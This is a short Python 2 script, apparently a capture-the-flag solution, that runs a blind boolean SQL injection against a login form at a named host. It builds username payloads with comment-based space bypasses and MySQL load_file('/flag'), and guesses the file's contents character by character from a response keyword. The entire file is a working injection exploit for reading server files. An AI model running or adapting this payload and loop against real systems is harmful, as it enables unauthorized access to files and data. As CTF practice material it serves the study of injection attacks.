# -*- coding:utf-8 -*-
import requests
import string
# print type(string.printable)

url = 'http://xss.tinmin.top:7777/index.php'
#data = {'username':'''admin'/**/&&/**/(insert((select/**/load_file('/flag')),2,100,'')='f')#''','password':'asd','submit':'login'}
flag = 'f'
for j in range(2,20):
	for i in string.printable[10:]:
		payload = '''admin'/**/&&/**/(insert((select/**/load_file('/flag')),'''+str(j)+''',100,'')='''+'\''+str(flag+i)+'\''+''')#'''
		data = {'username':payload,'password':'asd','submit':'login'}
		print payload
		if 'Howerver' in requests.post(url=url,data=data).content:
			flag += i
			j+=1
		else:
			pass

